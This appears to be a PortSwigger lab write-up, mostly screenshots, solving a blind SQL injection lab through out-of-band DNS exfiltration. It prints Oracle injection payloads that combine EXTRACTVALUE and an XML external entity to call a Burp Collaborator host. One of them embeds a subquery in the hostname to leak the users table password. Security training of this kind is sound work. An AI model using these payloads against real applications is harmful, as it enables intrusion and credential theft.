## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/21722f28-2778-47af-9d68-c9e469d1268d)

## Solution:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/ed6ba645-57a8-48a1-a53d-b754e9d2b4f8)
The payloads for each domain to perform a DNS lookup to an external domain to retrieve details of any DNS interactions, including the exfiltrated data.

Query made -

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'`

Request captured -

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/39ded0fd-83a0-4c17-ae77-0fca71d79236)

Send this to Repeater

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/11482004-9bb3-4993-b0b9-ef41bbca36db)

Then query will be changed by pasting the external domain provided by collaborator would look like this

`SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/8a154d6e-90fa-40e8-b199-365a8147fc70)

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a811621a-14f1-4886-85d5-bf8b0d628718)

By this we conformed that the databse is Oracle.

Now we need retrieve the passward from table called users, with columns called username and password.
For that the payload is

`SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/a8d0e4ec-06ad-4958-828e-8fe89e379999)

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/7b8b673f-8c26-43c4-b321-b7acde1bff42)

Lab Solved

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/0448c8ca-0131-4df6-b583-b405592f7b4b)


